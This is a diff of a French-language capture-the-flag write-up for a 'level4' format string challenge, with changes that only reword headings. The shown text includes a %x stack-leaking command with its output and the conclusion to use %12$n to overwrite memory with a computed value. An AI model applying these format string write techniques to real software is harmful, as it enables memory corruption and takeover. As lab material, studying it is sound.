@@ -1,4 +1,4 @@
-# level4
+# level4 — format string
 
     void p(char *param_1)
     {
@@ -35,12 +35,12 @@ Même faille que level3, `printf`
 https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=1025544
 0x1025544 = 16930116
 
-**Trouver la position de notre buffer dans la pile**
+**Trouver la position de notre buffer dans la stack**
 
     echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
     BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
 
-`BBBB` apparaît en 12e position cette fois (l'appel imbriqué `n()` → `p()` ajoute des niveaux de pile en plus par rapport à level3). Donc `%12$n`.
+`BBBB` apparaît en 12e position cette fois (l'appel imbriqué `n()` → `p()` ajoute des niveaux de stack en plus par rapport à level3). Donc `%12$n`.
 
 **Trouver l'adresse à écraser**
 
